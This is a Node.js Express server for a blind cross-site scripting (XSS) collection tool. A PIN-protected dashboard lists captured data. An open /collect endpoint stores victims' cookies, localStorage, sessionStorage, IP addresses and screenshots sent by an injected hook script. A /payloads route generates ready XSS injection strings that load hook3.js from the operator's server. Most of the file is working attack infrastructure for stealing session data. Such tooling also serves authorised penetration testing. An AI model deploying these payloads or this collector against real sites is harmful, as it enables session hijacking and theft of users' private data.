const fs = require('fs');
const http = require('http');
const https = require('https');
const express = require('express');
const cors = require('cors');
const path = require('path');
const session = require('express-session');
const db = require('./db');
require('dotenv').config();

const app = express();
const PIN = process.env.BLINDXSS_PIN;
const USE_HTTPS = process.env.USE_HTTPS === 'true';

if (!PIN) {
  console.error('Error: BLINDXSS_PIN not set in environment variables');
  process.exit(1);
}

app.use(cors());
app.use(express.json({ limit: '5mb' })); // Para evitar o erro PayloadTooLarge
app.use(express.urlencoded({ extended: true, limit: '5mb' }));

// Session setup
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: USE_HTTPS, // Apenas usa cookies seguros se estiveres em HTTPS
    sameSite: 'lax'
  }
}));

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use('/js', express.static(path.join(__dirname, 'public/js')));

// Root route redirection based on authentication
app.get('/', (req, res) => {
  if (req.session?.authenticated) {
    return res.redirect('/dashboard');
  } else {
    return res.redirect('/login');
  }
});

// Login page
app.get('/login', (req, res) => {
  if (req.session?.authenticated) {
    return res.redirect('/dashboard');
  }
  res.render('login', { error: null });
});

// Middleware to protect routes
function checkPin(req, res, next) {
  if (req.session?.authenticated) return next();
  return res.redirect('/login');
}

// Anti-brute force
const failedLoginAttempts = {};
const MAX_ATTEMPTS = 5;
const LOCK_TIME = 1 * 60 * 1000;

app.post('/login', (req, res) => {
  const userPin = req.body.pin;
  const userKey = req.ip;
  const attemptInfo = failedLoginAttempts[userKey] || { count: 0, lastFailedAt: 0 };

  if (attemptInfo.count >= MAX_ATTEMPTS) {
    const timePassed = Date.now() - attemptInfo.lastFailedAt;
    if (timePassed < LOCK_TIME) {
      const waitSeconds = Math.ceil((LOCK_TIME - timePassed) / 1000);
      return res.render('login', { error: `Too many failed attempts. Try again in ${waitSeconds} seconds.` });
    } else {
      failedLoginAttempts[userKey] = { count: 0, lastFailedAt: 0 };
    }
  }

  if (userPin === PIN) {
    delete failedLoginAttempts[userKey];
    req.session.authenticated = true;
    return res.redirect('/dashboard');
  } else {
    failedLoginAttempts[userKey] = {
      count: attemptInfo.count + 1,
      lastFailedAt: Date.now()
    };
    return res.render('login', { error: 'Incorrect PIN' });
  }
});

app.get('/logout', (req, res) => {
  req.session.destroy(() => res.redirect('/login'));
});

app.post('/collect', (req, res) => {
  const {
  url,
  cookies,  // should be a string, e.g. "key=value; key2=value2"
  userAgent,
  referer,
  screenResolution,
  localStorage,
  sessionStorage,
  ipAddress,
  screenshot
} = req.body;

  // Insert into DB
  db.run(`
    INSERT INTO payloads (
      url, referer, userAgent, screenResolution,
      cookies, localStorage, sessionStorage,
      publicIPv4, screenshot, ip, time
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `, [
    url,
    referer,
    userAgent,
    screenResolution,
    cookies,
    localStorage,
    sessionStorage,
    ipAddress?.publicIPv4 || "Unavailable",
    screenshot,
    req.headers['x-forwarded-for'] || req.connection.remoteAddress,
    new Date().toISOString()
  ], err => {
    if (err) console.error(err);
    else console.log('[XSS] Payload received:', req.body);
  });

  res.sendStatus(200);

});

// Protected routes
app.get('/dashboard', checkPin, (req, res) => {
  db.all('SELECT * FROM payloads ORDER BY id DESC', [], (err, rows) => {
    if (err) return res.status(500).send('Database error');
    res.render('dashboard', { payloads: rows });
  });
});

app.get('/payloads', checkPin, (req, res) => {
  const host = req.headers.host.split(':')[0];
  const payloadBase = `<script src="http://${host}:4000/js/hook3.js"></script>`;
  const payloads = [
    payloadBase,
    `<script src="http://${host}:4000/js/hook3.js"></script>`, 
    `<img src=x onerror="${payloadBase}">`,
    `<body onload="${payloadBase}">`,
    `"><script src="http://${host}:4000/js/hook3.js"></script>`,
    `<iframe src="javascript:eval('<script src=\\'http://${host}:4000/js/hook3.js\\'><\\/script>')">`,
  ];
  res.render('payloads', { payloads });
});

app.get('/about', checkPin, (req, res) => res.render('about'));
app.get('/notifications', checkPin, (req, res) => res.render('notifications'));
app.get('/map', checkPin, (req, res) => res.render('map'));

// Start servers
if (USE_HTTPS) {
  const sslOptions = {
    key: fs.readFileSync(process.env.SSL_KEY_PATH),
    cert: fs.readFileSync(process.env.SSL_CERT_PATH)
  };

  // HTTP redirect
  http.createServer((req, res) => {
    const host = req.headers.host.split(':')[0];
    res.writeHead(301, { "Location": "https://" + host + ":4001" + req.url });
    res.end();
  }).listen(4000, () => {
    console.log('HTTP redirector on http://localhost:4000');
  });

  https.createServer(sslOptions, app).listen(4001, () => {
    console.log('HTTPS server on https://localhost:4001');
  });
} else {
  // Run in HTTP only (desenvolvimento sem SSL)
  app.listen(4000, () => {
    console.log('HTTP server on http://localhost:4000');
  });
}
